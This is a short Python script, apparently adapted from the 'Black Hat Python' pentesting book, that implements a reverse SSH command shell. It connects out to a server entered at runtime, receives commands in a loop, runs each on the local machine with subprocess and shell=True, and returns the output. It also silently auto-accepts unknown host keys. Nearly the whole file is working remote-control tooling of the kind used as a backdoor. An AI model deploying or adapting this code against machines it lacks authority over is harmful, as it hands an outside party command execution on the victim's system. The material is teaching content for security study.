# Copyright (C) 2023 BLACK HAT PYTHON, Modified By Saman Pordanesh

import paramiko
import shlex
import subprocess

""""
    Pretty much the same as previous ssh_command function, but with a loop which can take more than one command
"""
def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    # set the policyto accept the SSH key for the SSH server we’re connecting to
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            # take commands from the connection
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                # execute the command
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True) 
                # send any output back to the caller
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return


if __name__ == '__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()
    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    # the first command we send is ClientConnected
    ssh_command(ip, port, user, password, 'ClientConnected')